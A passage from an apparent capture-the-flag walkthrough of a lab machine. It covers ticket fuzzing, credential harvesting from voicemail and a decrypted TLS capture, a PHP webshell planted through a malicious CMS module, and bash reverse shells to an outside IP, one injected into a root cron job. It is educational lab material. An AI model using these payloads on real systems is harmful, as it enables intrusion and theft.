Support","__v":0},"type":{"priorities":[{"overdueIn":2880,"htmlColor":"#29b955","_id":"623c8b24645f88065a113d67","name":"Normal","migrationNum":1,"default":true,"__v":0,"durationFormatted":"2 days","id":"623c8b24645f88065a113d67"},{"overdueIn":2880,"htmlColor":"#8e24aa","_id":"623c8b24645f88065a113d68","name":"Urgent","migrationNum":2,"default":true,"__v":0,"durationFormatted":"2 days","id":"623c8b24645f88065a113d68"},{"overdueIn":2880,"htmlColor":"#e65100","_id":"623c8b24645f88065a113d69","name":"Critical","migrationNum":3,"default":true,"__v":0,"durationFormatted":"2 days","id":"623c8b24645f88065a113d69"}],"_id":"623c8b20855cc5001a8ba137","name":"Task","__v":1},"priority":{"overdueIn":2880,"htmlColor":"#8e24aa","_id":"623c8b24645f88065a113d68","name":"Urgent","migrationNum":2,"default":true,"__v":0,"durationFormatted":"2 days","id":"623c8b24645f88065a113d68"},"issue":"<p>We have hired a new Network Engineer and need to get him set up with his credentials and phone before his start date next month.<br />Please create this account at your earliest convenience.<br /><br />Thank you.</p>\n","date":"2022-03-30T14:11:31.501Z","comments":[{"deleted":false,"_id":"624465512142479dd493d9ce","owner":{"_id":"623c8b20855cc5001a8ba13c","username":"admin","fullname":"Robert Frost","email":"rfrost@carpediem.htb","role":{"_id":"623c8b20855cc5001a8ba138","name":"Admin","description":"Default role for admins","normalized":"admin","isAdmin":true,"isAgent":true,"id":"623c8b20855cc5001a8ba138"},"title":"Sr. Network Engineer"},"date":"2022-03-30T14:12:33.060Z","comment":"<p>Hey Adeanna,<br>I think Joey is out this week, but I can take care of this. Whats the last 4 digits of his employee ID so I can get his extension set up in the VoIP system?</p>\n"},{"deleted":false,"_id":"624465562142479dd493d9d2","owner":{"_id":"6243c3471e0d4d001b0740d7","username":"acooke","email":"acooke@carpediem.htb","fullname":"Adeanna Cooke","title":"Director - Human Resources","role":{"_id":"623c8b20855cc5001a8ba139","name":"Support","description":"Default role for agents","normalized":"support","isAdmin":false,"isAgent":true,"id":"623c8b20855cc5001a8ba139"}},"date":"2022-03-30T14:12:38.123Z","comment":"<p>Thanks Robert,<br>Last 4 of employee ID is 9650.</p>\n"},{"deleted":false,"_id":"6244655f2142479dd493d9d5","owner":{"_id":"623c8b20855cc5001a8ba13c","username":"admin","fullname":"Robert Frost","email":"rfrost@carpediem.htb","role":{"_id":"623c8b20855cc5001a8ba138","name":"Admin","description":"Default role for admins","normalized":"admin","isAdmin":true,"isAgent":true,"id":"623c8b20855cc5001a8ba138"},"title":"Sr. Network Engineer"},"date":"2022-03-30T14:12:47.277Z","comment":"<p>Thank you! He&#39;s all set up and ready to go. When he gets to the office on his first day just have him log into his phone first. I&#39;ll leave him a voicemail with his initial credentials for server access. His phone pin code will be 2022 and to get into voicemail he can dial *62</p>\n<p>Also...let him know that if he wants to use a desktop soft phone that we&#39;ve been testing Zoiper with some of our end users.</p>\n<p>Changing the status of this ticket to pending until he&#39;s been set up and changes his initial credentials.</p>\n"}],"attachments":[],"history":[{"_id":"624465135596178468330933","action":"ticket:created","description":"Ticket was created.","owner":{"_id":"6243c3471e0d4d001b0740d7","username":"acooke","email":"acooke@carpediem.htb","fullname":"Adeanna Cooke","title":"Director - Human Resources","role":{"_id":"623c8b20855cc5001a8ba139","name":"Support","description":"Default role for agents","normalized":"support","isAdmin":false,"isAgent":true,"id":"623c8b20855cc5001a8ba139"}},"date":"2022-03-30T14:11:31.504Z"},{"_id":"624465232142479dd493d9cb","action":"ticket:set:status","description":"status set to: 1","owner":{"_id":"6243c3471e0d4d001b0740d7","username":"acooke","email":"acooke@carpediem.htb","fullname":"Adeanna Cooke","title":"Director - Human Resources","role":{"_id":"623c8b20855cc5001a8ba139","name":"Support","description":"Default role for agents","normalized":"support","isAdmin":false,"isAgent":true,"id":"623c8b20855cc5001a8ba139"}},"date":"2022-03-30T14:11:47.318Z"},{"_id":"6244652d2142479dd493d9cd","action":"ticket:set:assignee","description":"Joey Pardella was set as assignee","owner":{"_id":"6243c3471e0d4d001b0740d7","username":"acooke","email":"acooke@carpediem.htb","fullname":"Adeanna Cooke","title":"Director - Human Resources","role":{"_id":"623c8b20855cc5001a8ba139","name":"Support","description":"Default role for agents","normalized":"support","isAdmin":false,"isAgent":true,"id":"623c8b20855cc5001a8ba139"}},"date":"2022-03-30T14:11:57.663Z"},{"_id":"624465512142479dd493d9cf","action":"ticket:comment:added","description":"Comment was added","owner":{"_id":"623c8b20855cc5001a8ba13c","username":"admin","fullname":"Robert Frost","email":"rfrost@carpediem.htb","role":{"_id":"623c8b20855cc5001a8ba138","name":"Admin","description":"Default role for admins","normalized":"admin","isAdmin":true,"isAgent":true,"id":"623c8b20855cc5001a8ba138"},"title":"Sr. Network Engineer"},"date":"2022-03-30T14:12:33.072Z"},{"_id":"624465562142479dd493d9d3","action":"ticket:comment:added","description":"Comment was added","owner":{"_id":"6243c3471e0d4d001b0740d7","username":"acooke","email":"acooke@carpediem.htb","fullname":"Adeanna Cooke","title":"Director - Human Resources","role":{"_id":"623c8b20855cc5001a8ba139","name":"Support","description":"Default role for agents","normalized":"support","isAdmin":false,"isAgent":true,"id":"623c8b20855cc5001a8ba139"}},"date":"2022-03-30T14:12:38.124Z"},{"_id":"6244655f2142479dd493d9d6","action":"ticket:comment:added","description":"Comment was added","owner":{"_id":"623c8b20855cc5001a8ba13c","username":"admin","fullname":"Robert Frost","email":"rfrost@carpediem.htb","role":{"_id":"623c8b20855cc5001a8ba138","name":"Admin","description":"Default role for admins","normalized":"admin","isAdmin":true,"isAgent":true,"id":"623c8b20855cc5001a8ba138"},"title":"Sr. Network Engineer"},"date":"2022-03-30T14:12:47.277Z"},{"_id":"6244657a2142479dd493d9d9","action":"ticket:set:status","description":"status set to: 2","owner":{"_id":"623c8b20855cc5001a8ba13c","username":"admin","fullname":"Robert Frost","email":"rfrost@carpediem.htb","role":{"_id":"623c8b20855cc5001a8ba138","name":"Admin","description":"Default role for admins","normalized":"admin","isAdmin":true,"isAgent":true,"id":"623c8b20855cc5001a8ba138"},"title":"Sr. Network Engineer"},"date":"2022-03-30T14:13:14.794Z"}],"owner":{"_id":"6243c3471e0d4d001b0740d7","username":"acooke","email":"acooke@carpediem.htb","fullname":"Adeanna Cooke","title":"Director - Human Resources","role":{"_id":"623c8b20855cc5001a8ba139","name":"Support","description":"Default role for agents","normalized":"support","isAdmin":false,"isAgent":true,"id":"623c8b20855cc5001a8ba139"}},"uid":1006,"__v":6,"assignee":{"_id":"6243c28f1e0d4d001b0740d6","username":"jpardella","email":"jpardella@carpediem.htb","fullname":"Joey Pardella","title":"Desktop Support","role":{"_id":"623c8b20855cc5001a8ba139","name":"Support","description":"Default role for agents","normalized":"support","isAdmin":false,"isAgent":true,"id":"623c8b20855cc5001a8ba139"}},"updated":"2022-03-30T14:12:47.277Z"}}

```

I’ll also fuzz the range around that ID, finding five total tickets:

```

oxdf@hacky$ wfuzz -H "Content-Type: application/json" -H "accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" -z range,1000-2000 --hh 42 http://trudesk.carpediem.htb/api/v1/tickets/FUZZ 
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://trudesk.carpediem.htb/api/v1/tickets/FUZZ
Total requests: 1001

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000008:   200        0 L      97 W     3947 Ch     "1007"
000000009:   200        0 L      160 W    6393 Ch     "1008"
000000006:   200        0 L      98 W     5175 Ch     "1005"
000000005:   200        0 L      122 W    5831 Ch     "1004"
000000007:   200        0 L      291 W    8248 Ch     "1006"

Total time: 10.75033
Processed Requests: 1001
Filtered Requests: 996
Requests/sec.: 93.11336

```

### Ticket Analysis

#### Overview

There are five tickets available in trudesk, three of which aren’t too interesting:
- 1004 - Identifying risks in Portal and saying they need patching.
- 1005 - A silly ticket about one user wanting a handle.
- 1007 - Talks about future work integrating trudesk into Portal.

#### 1008

1008 is about the CMS, presumably the Backdrop CMS instance I identified earlier:

[![image-20221129092713665](https://0xdfimages.gitlab.io/img/image-20221129092713665.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221129092713665.png)

There’s nothing I need from this, but that it hasn’t be vetted for security is a good sign that I might want to look there in the future.

#### 1006

1006 is about a new employee onboarding. There are three comments:

[![image-20221129093754522](https://0xdfimages.gitlab.io/img/image-20221129093754522.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221129093754522.png)

The new employee’s information is in the ticket:
- Machine password will be in voicemail.
- Voicemail login is 9650.
- Voicemail pin is 2022.
- It suggests using Zoiper as a softphone.

There’s another subtle point to notice - all of the users have username of the format `[first initial][lastname]`, so the new employee’s username should be hflaccus.

### Get hflaccus Creds

#### Setup Zoiper

[Zoiper](https://www.zoiper.com/) is a “softphone” software, allowing you to make phonecalls over the internet. I’ll download the free Debian installer from the Downloads page, and install it with `sudo dpkg -i [download]`.

Running `zoiper5` pops a setup Window:

![image-20221129100037009](https://0xdfimages.gitlab.io/img/image-20221129100037009.png)

I’ll “Continue as a Free user”, and it advances to a login screen where I’ll entry the information from the ticket:

![image-20221129100608831](https://0xdfimages.gitlab.io/img/image-20221129100608831.png)

The next screen has the hostname already filled in, so I’ll just click “Next”:

![image-20221129100650382](https://0xdfimages.gitlab.io/img/image-20221129100650382.png)

The next window is optional, so I’ll just continue without it. It tries to connect, and looks like it succeeds on SIP UDP and IAX UDP:

![image-20221129100744813](https://0xdfimages.gitlab.io/img/image-20221129100744813.png)

It selects IAX for me, so I’ll go with that, knowing I should come back and try SIP if it fails. I’ll skip the extra configuration, and it loads a phone interface:

![image-20221129100848289](https://0xdfimages.gitlab.io/img/image-20221129100848289.png)

#### Get Voicemail

I’ll open the key pad and dial `*62`. It connects to the voicemail, which asks for a pin. I’ll enter 2022, and there’s one new voicemail. It says:

> Hey Horance, welcome aboard! We certainly needed more network engineers to assist with the infrastructure. Your account is ready to go. Your password is AuRj4pxq9qPk. Please reset it at your earliest convenience, as well as your phone pin code. Let me know if you have any issues. Robert.

### SSH

With the creds from the voicemail, and using the username format identified above, I’ll SSH to the main host:

```

oxdf@hacky$ sshpass -p AuRj4pxq9qPk ssh hflaccus@10.10.11.167
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-97-generic x86_64)
...[snip]...
hflaccus@carpediem:~$

```

And grab `user.txt`:

```

hflaccus@carpediem:~$ cat user.txt
6b0dbf74************************

```

## Shell as www-data in Backdrop Container

### Enumeration

The host is pretty empty. There’s nothing in hflaccus’ home directory. `/opt` and `/srv` are basically empty. The “coming soon” site is in `/var/www/html`, but it’s just a static single page.

`/proc` is mounted with `hidepid=2`, so the process list is limited to processes running as the current user:

```

hflaccus@carpediem:/var/www/html/landing$ mount | grep hidepid
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=2)
hflaccus@carpediem:/var/www/html/landing$ ps auxww 
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
hflaccus 1535209  0.0  0.2  19060  9692 ?        Ss   16:30   0:00 /lib/systemd/systemd --user
hflaccus 1535343  0.0  0.1   8404  5256 pts/0    Ss   16:30   0:00 -bash
hflaccus 1572801  0.0  0.0   8888  3336 pts/0    R+   17:09   0:00 ps auxww

```

Nothing unusual as far as SUID or GUID binaries, but there is an interesting file with capabilities:

```

hflaccus@carpediem:/$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

```

`tcpdump` has the capabilities on it to allow any user to sniff traiffic.

### Get Backdrop Creds

#### Capture

I’ll start a packet capture using `tcpdump`. There are a bunch of interfaces on the host:

```

hflaccus@carpediem:/$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:0c:57 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.167/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:c57/64 scope global dynamic mngtmpaddr 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:feb9:c57/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:d4:ad:1b:a3 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:d4ff:fead:1ba3/64 scope link 
       valid_lft forever preferred_lft forever
5: veth093cf07@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 4a:68:b4:07:13:a4 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::4868:b4ff:fe07:13a4/64 scope link 
       valid_lft forever preferred_lft forever
7: vethaac0b1d@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether d6:7d:d6:33:13:51 brd ff:ff:ff:ff:ff:ff link-netnsid 2
    inet6 fe80::d47d:d6ff:fe33:1351/64 scope link 
       valid_lft forever preferred_lft forever
9: veth692c950@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 12:21:e6:3b:a7:2d brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::1021:e6ff:fe3b:a72d/64 scope link 
       valid_lft forever preferred_lft forever
11: veth5f4f180@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 66:16:2b:11:de:25 brd ff:ff:ff:ff:ff:ff link-netnsid 3
    inet6 fe80::6416:2bff:fe11:de25/64 scope link 
       valid_lft forever preferred_lft forever
13: veth8afe6c0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether d6:b7:63:73:66:b4 brd ff:ff:ff:ff:ff:ff link-netnsid 4
    inet6 fe80::d4b7:63ff:fe73:66b4/64 scope link 
       valid_lft forever preferred_lft forever

```

To start, I’ll skip loopback (could check that later if I don’t find anything). `eth0` would get my traffic and other players, but probably not what I need here either. `docker0` will capture all the traffic on the 172.17.0.0/24 network, which could be interesting, especially given the comment in the tickets about securing the CMS instance. The rest of the virtual interfaces don’t have IPs, so I’ll skip those.

I’ll start `tcpdump` with `-i docker0` to collect on that interface, `-s 65535` to capture full frames, `and -w /tmp/0xdf.pcap` to save the results to a file. After a few minutes, I’ll Ctrl-c to exit:

```

hflaccus@carpediem:/$ tcpdump -ni docker0 -s 65535 -w /tmp/0xdf.pcap
tcpdump: listening on docker0, link-type EN10MB (Ethernet), capture size 65535 bytes
^C491 packets captured
491 packets received by filter
0 packets dropped by kernel

```

#### Exfil

To analyze this file, I want to get it back to my VM. I’ll use `scp`:

```

oxdf@hacky$ sshpass -p AuRj4pxq9qPk scp hflaccus@10.10.11.167:/tmp/0xdf.pcap .
oxdf@hacky$ file 0xdf.pcap 
0xdf.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)

```

#### Analysis

I’ll open the PCAP in Wireshark, and start with Statistics > Conversations. The IPv4 tab shows two conversations going on:

![image-20221129130808692](https://0xdfimages.gitlab.io/img/image-20221129130808692.png)
- 172.17.0.1 (host) is talking to 172.17.0.2 (Backdrop CMS).
- 172.17.0.4 (Mongo) is talking to 172.17.0.5 (trudesk).

Viewing it from the TCP tab, the picture becomes clearer:

![image-20221129131012469](https://0xdfimages.gitlab.io/img/image-20221129131012469.png)

There’s a bunch of connections where trudesk is querying mongo. And then there are sessions over 443 from the host to the CMS. There seem to be two groups of these, some around 47 k, and others around 4 k.

There’s nothing too interesting in the Mongo traffic. I already know that DB is setup without auth, and it’s mostly just checking in.

I can’t read the TLS traffic on 443 as it’s encrypted. But I can loop at the algorithms in place. In TLS, there’s a Client Hello message where the client reports all the different extensions / protocols / versions it supports. Then in the Server Hello response, it picks from those and reports back what will be used. In Wireshark, I can see these values in the Server Hello message:

[![image-20221129132128835](https://0xdfimages.gitlab.io/img/image-20221129132128835.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221129132128835.png)

Of interest in this case is the Cipher Suite, `TLS_RSA_WITH_AES_256_CBC_SHA256`. Googling for this will show several sites reporting is as a [weak cipher suite](https://ciphersuite.info/cs/TLS_RSA_WITH_AES_256_CBC_SHA256/).

#### Find Key

The issue here is that RSA doesn’t support Perfect Forward Secrecy (PFS):

![image-20221129132219897](https://0xdfimages.gitlab.io/img/image-20221129132219897.png)

PSF allows for an attacker to get ahold of the private key (the website’s certificate), and because of how the encryption is done, they still can’t access the plaintext. Without PFS, anyone with the certificate can decrypt the traffic.

Certificates are typically stored in `/etc/ssl/certs`. The private keys should be kept where only root can read them. There are a ton of files in this directory:

```

hflaccus@carpediem:/etc/ssl/certs$ ls -l
total 560
lrwxrwxrwx 1 root root     23 Jun 20 12:04 002c0b4f.0 -> GlobalSign_Root_R46.pem
lrwxrwxrwx 1 root root     45 Aug 24  2021 02265526.0 -> Entrust_Root_Certification_Authority_-_G2.pem
lrwxrwxrwx 1 root root     36 Aug 24  2021 03179a64.0 -> Staat_der_Nederlanden_EV_Root_CA.pem
lrwxrwxrwx 1 root root     27 Aug 24  2021 062cdee6.0 -> GlobalSign_Root_CA_-_R3.pem
lrwxrwxrwx 1 root root     25 Aug 24  2021 064e0aa9.0 -> QuoVadis_Root_CA_2_G3.pem
lrwxrwxrwx 1 root root     50 Aug 24  2021 06dc52d5.0 -> SSL.com_EV_Root_Certification_Authority_RSA_R2.pem
lrwxrwxrwx 1 root root     54 Aug 24  2021 09789157.0 -> Starfield_Services_Root_Certificate_Authority_-_G2.pem
lrwxrwxrwx 1 root root     15 Aug 24  2021 0a775a30.0 -> GTS_Root_R3.pem
...[snip]...

```

However, I’ll notice that most are symlinks. I’ll `grep` those out:

```

hflaccus@carpediem:/etc/ssl/certs$ ls -l | grep -v '\->'
total 560
-rw-r--r-- 1 root root   1269 Apr  7  2022 backdrop.carpediem.htb.crt
-rw-r--r-- 1 root root   1679 Apr  7  2022 backdrop.carpediem.htb.key
-rw-r--r-- 1 root root 195453 Jun 20 12:05 ca-certificates.crt

```

There are two files related to the traffic I want to decrypt. I’ll download them to my host:

```

oxdf@hacky$ sshpass -p AuRj4pxq9qPk scp hflaccus@10.10.11.167://etc/ssl/certs/backdrop* .

```

#### Decrypt TLS

Edit > Preferences will open the preferences, and then I want Protocols > TLS:

![image-20221129133452523](https://0xdfimages.gitlab.io/img/image-20221129133452523.png)

I’ll click “Edit” by the RSA keys list to get the next dialog. Clicking the plus, I’ll fill in the next row:

[![image-20221129133540121](https://0xdfimages.gitlab.io/img/image-20221129133540121.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20221129133540121.png)

Now when I right click on a TLS packet and select Follow, where I usually select TCP Steam, there are new options:

![image-20221129133641785](https://0xdfimages.gitlab.io/img/image-20221129133641785.png)

Either TLS Stream of HTTP Stream will load the decrypted stream. In the PCAP, there’s a login POST request:

```

POST /?q=user/login HTTP/1.1
Host: backdrop.carpediem.htb:8002
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Origin: https://backdrop.carpediem.htb:8002
Content-Type: application/x-www-form-urlencoded
Referer: https://backdrop.carpediem.htb:8002/?q=user/login
Accept-Language: en-US,en;q=0.9
Content-Length: 128

name=jpardella&pass=tGPN6AmJDZwYWdhY&form_build_id=form-rXfWvmvOz0ihcfyBBwhTF3TzC8jkPBx4LvUBrdAIsU8&form_id=user_login&op=Log+in

```

The response is a 302 redirect, so it seems to be successful:

```

HTTP/1.1 302 Found
Date: Tue, 29 Nov 2022 18:01:01 GMT
Server: Apache/2.4.48 (Ubuntu)
Expires: Fri, 16 Jan 2015 07:50:00 GMT
Last-Modified: Tue, 29 Nov 2022 18:01:01 +0000
Cache-Control: no-cache, must-revalidate
X-Content-Type-Options: nosniff
ETag: "1669744861"
Set-Cookie: SSESS0651e6855a1f90fa8155e44165bd9f99=ry-HE9DHHXjtmxOgelgDcnNIYtIVvGuFEJ1DiCBeb1Q; expires=Thu, 22-Dec-2022 21:34:21 GMT; Max-Age=2000000; path=/; domain=.backdrop.carpediem.htb; secure; HttpOnly
Location: https://backdrop.carpediem.htb:8002/?q=admin/dashboard
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```

I’ll note the creds jpardella / tGPN6AmJDZwYWdhY.

### RCE in Backdrop CMS

#### Login

Using either my chisel proxy or an SSH tunnel, I’ll load the Backdrop page in Firefox. The creds work, and it redirects to the Backdrop admin dashboard:

[![image-20221129140130945](https://0xdfimages.gitlab.io/img/image-20221129140130945.png)](https://0xdfimages.gitlab.io/img/image-20221129140130945.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20221129140130945.png)

#### Exploits

Searching for Backdrop CMS exploits, [this repo](https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS) comes up. It describes an attack path using a cross-site request forgery (CSRF) to get an admin to install a malicious plugin, which gives a webshell. I don’t need the CSRF, as I can already log into the admin panel. So I’ll just use the plugin.

I’ll download `reference.tar` from the [release page](https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/tag/backdrop) and take a look at it:

![image-20221129141754028](https://0xdfimages.gitlab.io/img/image-20221129141754028.png)

It has the default files similar to what’s in this [example repo](https://github.com/backdrop-contrib/module_template), but it also has a `shell.php`. The idea is that when the module is installed, these files are all decompressed into a location I can know and access.

`shell.php` has a very simple PHP webshell:

```

<?php system($_GET['cmd']);?>

```

#### Upload

I’ll upload the module by going to Functionality > Install New Modules in the top menu:

![image-20221129142042584](https://0xdfimages.gitlab.io/img/image-20221129142042584.png)

At the bottom right of the next page, I’ll click “Manual Installation”:

![image-20221129142130106](https://0xdfimages.gitlab.io/img/image-20221129142130106.png)

I’ll expand the “Upload a module, theme, or layout archive to install”, and give it `reference.tar`:

![image-20221129142223052](https://0xdfimages.gitlab.io/img/image-20221129142223052.png)

On clicking Install, it says it’s successful:

![image-20221129142009737](https://0xdfimages.gitlab.io/img/image-20221129142009737.png)

#### RCE

I can find the shell at `/modules/[name of module]/shell.php`. In my case, the name will be `reference`. It works:

![image-20221129142315439](https://0xdfimages.gitlab.io/img/image-20221129142315439.png)

### Shell

I’ll get a shell by passing a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) to the webshell:

```

oxdf@hacky$ curl -kG  https://localhost:4433/modules/reference/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'

```

At `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.167 33644
bash: cannot set terminal process group (281): Inappropriate ioctl for device
bash: no job control in this shell
www-data@90c7f522b842:/var/www/html/backdrop/modules/reference$

```

I’ll [upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q) the shell:

```

www-data@90c7f522b842:/var/www/html/backdrop/modules/reference$ script /dev/null -c bash 
<ackdrop/modules/reference$ script /dev/null -c bash             
Script started, output log file is '/dev/null'.
www-data@90c7f522b842:/var/www/html/backdrop/modules/reference$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@90c7f522b842:/var/www/html/backdrop/modules/reference$

```

## Shell as root in Backdrop Container

### Enumeration

#### File System

The file system is rather empty, with the majority of the files living in the `/var/www/html/backdrop` directory. There is a file in `/opt`, `heartbeat.sh`:

```

www-data@90c7f522b842:/$ ls -l /opt/
total 4
-rwxr-xr-x 1 root root 510 Jun 23 09:49 heartbeat.sh

```

The process listing shows that it seems to be running as root on a cron twice each minute, once after a `sleep 15`, and the other after a `sleep 45`:

```

www-data@90c7f522b842:/$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...[snip]...
root       35869  0.0  0.0   6372  3644 ?        S    13:36   0:00 /usr/sbin/CRON -P
root       35870  0.0  0.0   6372  3640 ?        S    13:36   0:00 /usr/sbin/CRON -P
root       35871  0.0  0.0   2864   928 ?        Ss   13:36   0:00 /bin/sh -c sleep 15; /bin/bash /opt/heartbeat.sh
root       35872  0.0  0.0   2864  1032 ?        Ss   13:36   0:00 /bin/sh -c sleep 45; /bin/bash /opt/heartbeat.sh
root       35873  0.0  0.0   2772   976 ?        S    13:36   0:00 sleep 45
root       35874  0.0  0.0   2772   936 ?        S    13:36   0:00 sleep 15
www-data   35875  0.0  0.0   6908  1564 pts/3    R+   13:36   0:00 ps auxww

```

This file is only writable by root.

#### heartbeat.sh

The script is an availability check:

```

#!/bin/bash
#Run a site availability check every 10 seconds via cron
checksum=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))
if [[ $checksum != "70a121c0202a33567101e2330c069b34" ]]; then
        exit
fi
status=$(php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost)
grep "Welcome to backdrop.carpediem.htb!" "$status"
if [[ "$?" != 0 ]]; then
        #something went wrong.  restoring from backup.
        cp /root/index.php /var/www/html/backdrop/index.php
fi

```

It checks the md5sum of `backdrop.sh`, a file in the Backdrop scripts directory. The checksum does match:

```

www-data@90c7f522b842:/$ md5sum /var/www/html/backdrop/core/scripts/backdrop.sh
70a121c0202a33567101e2330c069b34  /var/www/html/backdrop/core/scripts/backdrop.sh

```

It then runs that file, and captures the results as `$status`.

It then does a `grep` that cannot succeed (not really important, but it annoys me, so I’ll look at it in [Beyond Root](#heartbeatsh-1)), and if it fails, then it restores the main `index.php` file from a copy in `/root`.

#### backdrop.sh

This file is actually part of the Backdrop files, not something custom for CarpeDiem, available on GitHub [here](https://github.com/backdrop/backdrop/blob/1.x/core/scripts/backdrop.sh). Despite ending in `.sh`, it’s actually a PHP script.

Because it’s part of the repo, it’s well documented. The help message is:

```

Execute a Backdrop page from the shell.
Usage:        {$script} [OPTIONS] "<URI>"
Example:      {$script} "http://mysite.org/node"
All arguments are long options.
  --help      This page.
  --root      Set the working directory for the script to the specified path.
              To execute Backdrop this has to be the root directory of your
              Backdrop installation, f.e. /home/www/foo/backdrop (assuming
              Backdrop is running on Unix). Current directory is not required.
              Use surrounding quotation marks on Windows.
  --verbose   This option displays the options as they are set, but will
              produce errors from setting the session.
  URI         The URI to execute, i.e. http://default/foo/bar for executing
              the path '/foo/bar' in your site 'default'. URI has to be
              enclosed by quotation marks if there are ampersands in it
              (f.e. index.php?q=node&foo=bar). Prefix 'http://' is required,
              and the domain must exist in Backdrop's sites-directory.
              If the given path and file exists it will be executed directly,
              i.e. if URI is set to http://default/bar/foo.php
              and bar/foo.php exists, this script will be executed without
              bootstrapping Backdrop. To execute Backdrop's cron.php, specify
              http://default/core/cron.php as the URI.
To run this script without --root argument invoke it from the root directory
of your Backdrop installation with
  ./scripts/{$script}

```

So basically, this invocation `php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost` is executing the root page and returning the result.

### Shell

#### Strategy

Knowing that root is executing this script every 30 seconds, I’m going to look for way to exploit this. I also know that every time it runs the `index.php` file will reset. I don’t have permissions to modify `heartbeat.sh`. I can’t modify `backdrop.sh` either, and even if I could, the hash would change and the script wouldn’t run past that check.

`index.php` is owned by www-data, and thus I can edit it:

```

www-data@90c7f522b842:/$ ls -l /var/www/html/backdrop/index.php 
-rw-r--r-- 1 www-data www-data 578 May 25  2022 /var/www/html/backdrop/index.php

```

If I write PHP to this file, it will be run as root.

#### POC

To test if this works, I first started to set up to use `ping`, which cost me a bit of time since `ping` isn’t installed on this host. On eventually figuring that out, I’ll try to touch a file. I like to start with a simple payload so that if it doesn’t work, I have fewer things to troubleshoot.

I’ll add a line to the end of `index.php` that will touch a file:

```

www-data@90c7f522b842:/$ echo 'system("touch /tmp/0xdf-was-here");' >> /var/www/html/backdrop/index.php

```

The next time the cron runs, the file is there, and owned by root:

```

www-data@90c7f522b842:/$ ls -l /tmp/
total 4
-rw-r--r-- 1 root     root        0 Nov 29 16:45 0xdf-was-here
drwxr-xr-x 3 www-data www-data 4096 Nov 29 13:25 update-extraction-eda0efe4

```

#### Shell

I’ll write a short Bash script that returns a reverse shell:

```

www-data@90c7f522b842:/$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/9001 0>&1' > /tmp/0xdf.sh

```

I’ll test it to see if it connects back (as www-data):

```

www-data@90c7f522b842:/$ bash /tmp/0xdf.sh

```

It connects to my `nc` with a shell. Now I’ll add it to the PHP script:

```

www-data@90c7f522b842:/$ echo 'system("bash /tmp/0xdf.sh");' >> /var/www/html/backdrop/index.php         

```

The next time the cron runs, a root shell connects back:

```

oxdf@hacky$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.167 52718
root@90c7f522b842:/var/www/html/backdrop#

```

I’ll upgrade using the typically trick.

## Shell as root on Host

